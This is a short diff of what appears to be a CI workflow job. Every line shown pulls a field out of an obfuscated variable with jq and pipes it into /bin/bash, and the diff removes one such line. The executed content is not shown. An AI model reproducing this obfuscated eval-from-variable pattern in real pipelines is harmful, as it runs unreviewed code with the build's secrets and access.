@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$l02530" | jq -r .erp998 | /bin/bash
           printf '%s' "$lny07092" | jq -r .fpoqy95307 | /bin/bash
           echo $eyngq3 | jq -r .frtf31 | /bin/bash
-          echo $tfqcm9 | jq -r .cd8556 | /bin/bash
           printf '%s' "$lwjxd94" | jq -r .wome20 | /bin/bash
           echo $nvpsj47 | jq -r .supv7 | /bin/bash
           echo $n75 | jq -r .odym91639 | /bin/bash
